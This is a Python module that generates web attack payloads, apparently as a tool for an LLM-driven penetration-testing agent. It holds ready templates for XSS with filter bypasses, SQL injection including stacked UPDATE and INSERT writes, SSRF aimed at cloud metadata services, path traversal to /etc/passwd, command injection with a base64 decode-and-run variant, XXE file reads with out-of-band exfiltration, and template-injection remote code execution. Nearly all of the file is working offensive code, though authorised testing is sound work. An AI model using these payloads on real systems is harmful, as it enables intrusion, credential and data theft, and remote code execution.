"""
Payload Generator - Create sophisticated payloads for vulnerability testing
Easy for LLM to generate and customize payloads
"""

import re
import base64
import urllib.parse
from typing import Dict, List, Optional, Any
from dataclasses import dataclass


@dataclass
class Payload:
    """Generated payload with metadata"""
    payload: str
    category: str
    technique: str
    description: str
    context: str
    encoded_variants: Dict[str, str]
    
    def to_dict(self) -> Dict:
        return {
            "payload": self.payload,
            "category": self.category,
            "technique": self.technique,
            "description": self.description,
            "context": self.context,
            "encoded_variants": self.encoded_variants
        }


class PayloadGenerator:
    """
    Sophisticated payload generator
    
    Usage for LLM:
    - gen.xss(context, bypass) - Generate XSS payload
    - gen.sqli(technique, db) - Generate SQLi payload
    - gen.ssrf(target) - Generate SSRF payload
    - gen.encode(payload, method) - Encode payload
    - gen.mutate(payload) - Create variations
    """
    
    def __init__(self):
        # XSS contexts and corresponding payloads
        self.xss_contexts = {
            "html": {
                "basic": '<script>alert(1)</script>',
                "img": '<img src=x onerror=alert(1)>',
                "svg": '<svg onload=alert(1)>',
                "body": '<body onload=alert(1)>',
                "iframe": '<iframe src="javascript:alert(1)">',
            },
            "attribute": {
                "event": '" onmouseover="alert(1)',
                "focus": '" onfocus="alert(1)" autofocus="',
                "href": 'javascript:alert(1)',
                "style": 'expression(alert(1))',
            },
            "javascript": {
                "break_string": "';alert(1)//",
                "break_double": '";alert(1)//',
                "template": '${alert(1)}',
                "close_script": '</script><script>alert(1)</script>',
            },
            "url": {
                "javascript": 'javascript:alert(1)',
                "data": 'data:text/html,<script>alert(1)</script>',
            }
        }
        
        # SQLi techniques
        self.sqli_techniques = {
            "union": {
                "basic": "' UNION SELECT {columns}--",
                "all": "' UNION ALL SELECT {columns}--",
                "null": "' UNION SELECT {nulls}--",
            },
            "error": {
                "mysql": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "mssql": "' AND 1=CONVERT(int,(SELECT {query}))--",
                "oracle": "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT {query} FROM dual))--",
            },
            "blind_boolean": {
                "basic": "' AND (SELECT CASE WHEN ({condition}) THEN 1 ELSE (SELECT 1 FROM {table}) END)=1--",
                "substring": "' AND SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{char}'--",
            },
            "blind_time": {
                "mysql": "' AND IF(({condition}),SLEEP({delay}),0)--",
                "mssql": "'; IF ({condition}) WAITFOR DELAY '0:0:{delay}'--",
                "postgresql": "'; SELECT CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--",
            },
            "stacked": {
                "basic": "'; {query}--",
                "insert": "'; INSERT INTO {table} VALUES({values})--",
                "update": "'; UPDATE {table} SET {column}={value}--",
            }
        }
        
        # Encoding methods
        self.encoders = {
            "url": lambda s: urllib.parse.quote(s),
            "double_url": lambda s: urllib.parse.quote(urllib.parse.quote(s)),
            "html": lambda s: ''.join(f'&#{ord(c)};' for c in s),
            "hex": lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
            "unicode": lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
            "base64": lambda s: base64.b64encode(s.encode()).decode(),
            "mixed_case": lambda s: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s)),
        }

    def xss(self, context: str = "html", variant: str = "basic",
            custom_code: str = "alert(1)", bypass: Optional[str] = None) -> Payload:
        """
        Generate XSS payload
        
        Args:
            context: html, attribute, javascript, url
            variant: Specific variant (basic, img, svg, etc.)
            custom_code: JavaScript to execute
            bypass: Filter to bypass (tags, quotes, parentheses, waf)
        
        Returns:
            Payload object with variants
        """
        # Get base payload
        base = self.xss_contexts.get(context, {}).get(variant, '<script>alert(1)</script>')
        
        # Customize with custom code
        payload = base.replace("alert(1)", custom_code)
        
        # Apply bypass technique
        if bypass == "tags":
            payload = payload.replace("<", "\\x3c").replace(">", "\\x3e")
        elif bypass == "quotes":
            payload = payload.replace('"', '\\"').replace("'", "\\'")
        elif bypass == "parentheses":
            payload = payload.replace("()", "``")
        elif bypass == "waf":
            # Apply multiple obfuscation
            payload = self._obfuscate_xss(payload)
        
        # Generate encoded variants
        variants = {
            "url_encoded": self.encoders["url"](payload),
            "double_url": self.encoders["double_url"](payload),
            "html_encoded": self.encoders["html"](payload),
            "mixed_case": self.encoders["mixed_case"](payload),
        }
        
        return Payload(
            payload=payload,
            category="xss",
            technique=f"{context}_{variant}",
            description=f"XSS payload for {context} context using {variant} technique",
            context=context,
            encoded_variants=variants
        )

    def _obfuscate_xss(self, payload: str) -> str:
        """Apply WAF bypass obfuscation"""
        # Split tags with null bytes
        payload = payload.replace("<script", "<scr\x00ipt")
        # Use HTML entities for keywords
        payload = payload.replace("alert", "&#97;lert")
        # Add garbage
        payload = payload.replace(">", " >")
        return payload

    def sqli(self, technique: str = "union", db: str = "mysql",
             columns: int = 3, query: str = "@@version",
             table: str = "users", condition: str = "1=1") -> Payload:
        """
        Generate SQL injection payload
        
        Args:
            technique: union, error, blind_boolean, blind_time, stacked
            db: mysql, mssql, oracle, postgresql
            columns: Number of columns for UNION
            query: Query/value to extract
            table: Target table
            condition: Boolean condition
        
        Returns:
            Payload object
        """
        templates = self.sqli_techniques.get(technique, {})
        
        if db in templates:
            template = templates[db]
        else:
            template = templates.get("basic", "' OR 1=1--")
        
        # Fill in template
        payload = template.format(
            columns=",".join([query] + ["NULL"] * (columns - 1)),
            nulls=",".join(["NULL"] * columns),
            query=query,
            condition=condition,
            table=table,
            column="password",
            value="'pwned'",
            values="'hacked'",
            delay="5",
            pos="1",
            char="a"
        )
        
        variants = {
            "url_encoded": self.encoders["url"](payload),
            "double_url": self.encoders["double_url"](payload),
            "no_spaces": payload.replace(" ", "/**/"),
            "comments": payload.replace(" ", "/**/").replace("--", "-- -"),
        }
        
        return Payload(
            payload=payload,
            category="sqli",
            technique=f"{technique}_{db}",
            description=f"SQL injection using {technique} for {db}",
            context="parameter",
            encoded_variants=variants
        )

    def ssrf(self, target: str = "localhost", port: int = 80,
             protocol: str = "http", bypass: Optional[str] = None) -> Payload:
        """
        Generate SSRF payload
        
        Args:
            target: Target host (localhost, aws_meta, gcp_meta, internal_ip)
            port: Target port
            protocol: http, gopher, dict, file
            bypass: Bypass technique (encoding, dns, redirect)
        
        Returns:
            Payload object
        """
        targets = {
            "localhost": "127.0.0.1",
            "aws_meta": "169.254.169.254/latest/meta-data/",
            "gcp_meta": "metadata.google.internal/computeMetadata/v1/",
            "azure_meta": "169.254.169.254/metadata/instance",
        }
        
        host = targets.get(target, target)
        
        if protocol == "file":
            payload = f"file:///etc/passwd"
        elif protocol == "gopher":
            payload = f"gopher://{host}:{port}/_"
        elif protocol == "dict":
            payload = f"dict://{host}:{port}/info"
        else:
            payload = f"http://{host}:{port}/"
        
        # Apply bypass
        if bypass == "encoding":
            host_encoded = self.encoders["url"](host)
            payload = f"http://{host_encoded}:{port}/"
        elif bypass == "dns":
            payload = f"http://localtest.me:{port}/"  # Resolves to 127.0.0.1
        elif bypass == "decimal":
            # Convert 127.0.0.1 to decimal
            payload = f"http://2130706433:{port}/"
        elif bypass == "redirect":
            payload = f"http://httpbin.org/redirect-to?url=http://{host}:{port}/"
        
        variants = {
            "url_encoded": self.encoders["url"](payload),
            "decimal_ip": f"http://2130706433:{port}/" if target == "localhost" else payload,
            "ipv6": f"http://[::1]:{port}/" if target == "localhost" else payload,
        }
        
        return Payload(
            payload=payload,
            category="ssrf",
            technique=f"{protocol}_{target}",
            description=f"SSRF payload targeting {target} via {protocol}",
            context="url_parameter",
            encoded_variants=variants
        )

    def lfi(self, file: str = "/etc/passwd", depth: int = 5,
            wrapper: Optional[str] = None, null_byte: bool = False) -> Payload:
        """
        Generate LFI payload
        
        Args:
            file: Target file
            depth: Traversal depth
            wrapper: PHP wrapper (filter, input, data)
            null_byte: Add null byte
        
        Returns:
            Payload object
        """
        traversal = "../" * depth
        
        if wrapper == "filter":
            payload = f"php://filter/convert.base64-encode/resource={file}"
        elif wrapper == "input":
            payload = "php://input"
        elif wrapper == "data":
            payload = "data://text/plain,<?php phpinfo(); ?>"
        elif wrapper == "expect":
            payload = "expect://id"
        else:
            payload = traversal + file.lstrip("/")
        
        if null_byte:
            payload += "%00"
        
        variants = {
            "url_encoded": self.encoders["url"](payload),
            "double_encoded": self.encoders["double_url"](payload),
            "unicode_bypass": payload.replace("../", "..%c0%af"),
            "double_dots": payload.replace("../", "....//"),
        }
        
        return Payload(
            payload=payload,
            category="lfi",
            technique=f"traversal_depth{depth}" if not wrapper else f"wrapper_{wrapper}",
            description=f"LFI payload for {file}",
            context="file_parameter",
            encoded_variants=variants
        )

    def command_injection(self, command: str = "id",
                         separator: str = ";",
                         blind: bool = False) -> Payload:
        """
        Generate command injection payload
        
        Args:
            command: Command to execute
            separator: Command separator (; | & || &&)
            blind: Use blind/OOB technique
        
        Returns:
            Payload object
        """
        separators = {
            "semicolon": f"; {command}",
            "pipe": f"| {command}",
            "and": f"&& {command}",
            "or": f"|| {command}",
            "ampersand": f"& {command}",
            "newline": f"\n{command}",
            "backtick": f"`{command}`",
            "subshell": f"$({command})",
        }
        
        payload = separators.get(separator, f"; {command}")
        
        if blind:
            # Use sleep for blind detection
            payload = f"; sleep 5"
        
        variants = {
            "url_encoded": self.encoders["url"](payload),
            "hex": self.encoders["hex"](command),
            "base64_decode": f"; echo {base64.b64encode(command.encode()).decode()} | base64 -d | sh",
            "iex_bypass": f"; {command.replace(' ', '${IFS}')}",
        }
        
        return Payload(
            payload=payload,
            category="command_injection",
            technique=f"separator_{separator}",
            description=f"Command injection with {separator} separator",
            context="command_parameter",
            encoded_variants=variants
        )

    def xxe(self, file: str = "/etc/passwd", external: bool = False,
            oob_url: Optional[str] = None) -> Payload:
        """
        Generate XXE payload
        
        Args:
            file: File to read
            external: Use external DTD
            oob_url: Out-of-band URL for blind XXE
        
        Returns:
            Payload object
        """
        if external and oob_url:
            payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "{oob_url}">
%xxe;
]>
<foo>&send;</foo>'''
        else:
            payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file://{file}">
]>
<foo>&xxe;</foo>'''
        
        variants = {
            "parameter_entity": f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file://{file}">
<!ENTITY % wrapper "<!ENTITY send '%xxe;'>">
%wrapper;
]>
<foo>&send;</foo>''',
            "cdata": f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file://{file}">
]>
<foo><![CDATA[&xxe;]]></foo>''',
        }
        
        return Payload(
            payload=payload,
            category="xxe",
            technique="external_entity" if not external else "oob_xxe",
            description=f"XXE payload to read {file}",
            context="xml_body",
            encoded_variants=variants
        )

    def ssti(self, template_engine: str = "jinja2",
             command: str = "id") -> Payload:
        """
        Generate SSTI payload
        
        Args:
            template_engine: jinja2, twig, freemarker, velocity
            command: Command to execute
        
        Returns:
            Payload object
        """
        payloads = {
            "jinja2": {
                "detect": "{{7*7}}",
                "rce": "{{config.__class__.__init__.__globals__['os'].popen('" + command + "').read()}}",
            },
            "twig": {
                "detect": "{{7*7}}",
                "rce": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('" + command + "')}}",
            },
            "freemarker": {
                "detect": "${7*7}",
                "rce": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + command + '")}',
            },
            "velocity": {
                "detect": "#set($x=7*7)$x",
                "rce": "#set($str=$class.inspect('java.lang.Runtime').type.getMethod('getRuntime').invoke(null).exec('" + command + "'))",
            },
            "erb": {
                "detect": "<%= 7*7 %>",
                "rce": "<%= `" + command + "` %>",
            }
        }
        
        engine_payloads = payloads.get(template_engine, payloads["jinja2"])
        payload = engine_payloads["rce"]
        
        variants = {
            "detect": engine_payloads["detect"],
            "url_encoded": self.encoders["url"](payload),
        }
        
        return Payload(
            payload=payload,
            category="ssti",
            technique=template_engine,
            description=f"SSTI payload for {template_engine} to execute {command}",
            context="template_input",
            encoded_variants=variants
        )

    def encode(self, payload: str, method: str = "url") -> str:
        """
        Encode payload
        
        Args:
            payload: Payload to encode
            method: Encoding method
        
        Returns:
            Encoded payload
        """
        encoder = self.encoders.get(method)
        if encoder:
            return encoder(payload)
        return payload

    def mutate(self, payload: str, mutations: int = 5) -> List[str]:
        """
        Generate mutations of a payload
        
        Args:
            payload: Original payload
            mutations: Number of mutations
        
        Returns:
            List of mutated payloads
        """
        mutated = [payload]
        
        # URL encoding
        mutated.append(self.encoders["url"](payload))
        
        # Double URL encoding
        mutated.append(self.encoders["double_url"](payload))
        
        # Mixed case
        mutated.append(self.encoders["mixed_case"](payload))
        
        # Space replacement
        mutated.append(payload.replace(" ", "%20"))
        mutated.append(payload.replace(" ", "+"))
        mutated.append(payload.replace(" ", "/**/"))
        
        # Quote alternation
        mutated.append(payload.replace("'", '"'))
        mutated.append(payload.replace('"', "'"))
        
        # Null byte insertion
        mutated.append(payload + "%00")
        
        return list(set(mutated))[:mutations + 1]

    def get_all_payloads(self, category: str = "xss") -> List[Payload]:
        """Get all payloads for a category"""
        payloads = []
        
        if category == "xss":
            for context, variants in self.xss_contexts.items():
                for variant in variants:
                    payloads.append(self.xss(context, variant))
        elif category == "sqli":
            for technique in self.sqli_techniques:
                for db in ["mysql", "mssql", "postgresql", "oracle"]:
                    try:
                        payloads.append(self.sqli(technique, db))
                    except:
                        pass
        
        return payloads
